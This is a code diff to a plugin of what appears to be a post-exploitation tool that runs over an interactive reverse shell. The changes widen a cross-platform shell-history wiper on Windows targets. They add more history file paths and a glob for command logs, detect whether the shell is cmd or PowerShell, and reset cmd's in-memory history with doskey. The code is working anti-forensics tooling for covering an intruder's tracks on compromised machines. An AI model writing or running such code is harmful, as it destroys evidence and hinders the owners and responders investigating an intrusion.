@@ -1,6 +1,7 @@
 """Cross-platform shell history clearing for the current user/session."""
 
 from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
+from ...win_client import detect_windows_shell_kind
 from ..api import plugin, SessionContext
 from ..linux._helpers import build_linux_collector_command
 from .common import format_historydel_report, resolve_session_platform
@@ -66,8 +67,18 @@ $files=@(
   (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'),
   (Join-Path $env:ProgramData 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'),
   (Join-Path $env:USERPROFILE '.python_history'),
-  (Join-Path $env:USERPROFILE '.node_repl_history')
+  (Join-Path $env:USERPROFILE '.node_repl_history'),
+  (Join-Path $env:LOCALAPPDATA 'clink\.history'),
+  (Join-Path $env:USERPROFILE 'cmd_history.log'),
+  (Join-Path $env:USERPROFILE 'cmd.log'),
+  (Join-Path $env:USERPROFILE 'commands.log'),
+  (Join-Path $env:USERPROFILE '.history')
 )
+try{{
+  Get-ChildItem -Path $env:USERPROFILE -Filter 'cmd_history*.log' -File -EA 0|ForEach-Object{{
+    if($files -notcontains $_.FullName){{$files+=$_.FullName}}
+  }}
+}}catch{{}}
 foreach($p in $files){{
   if(Test-Path $p){{
     try{{
@@ -98,6 +109,15 @@ Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
 """
 
 
+def _resolve_win_shell_kind(session: SessionContext) -> str:
+    kind = (session._info or {}).get('win_shell')
+    if kind in ('cmd', 'powershell'):
+        return kind
+    kind = detect_windows_shell_kind(session._handler, session._client_sock)
+    session._info['win_shell'] = kind
+    return kind
+
+
 def _session_history_cleanup(session: SessionContext) -> str:
     """Clear in-memory history in the interactive reverse shell when possible."""
     platform = resolve_session_platform(session)
@@ -109,6 +129,10 @@ def _session_history_cleanup(session: SessionContext) -> str:
         )
         return 'bash/zsh in-memory history cleared' if out is not None else 'attempted'
     if platform == 'windows':
+        shell_kind = _resolve_win_shell_kind(session)
+        if shell_kind == 'cmd':
+            session.run_shell('doskey /reinstall >nul 2>&1', timeout=5.0)
+            return 'cmd.exe in-memory history cleared (doskey buffer reset)'
         session.run_marked('', 'Clear-History -ErrorAction SilentlyContinue', timeout=5.0)
         return 'PowerShell in-memory history cleared (if PS session)'
     return 'skipped'
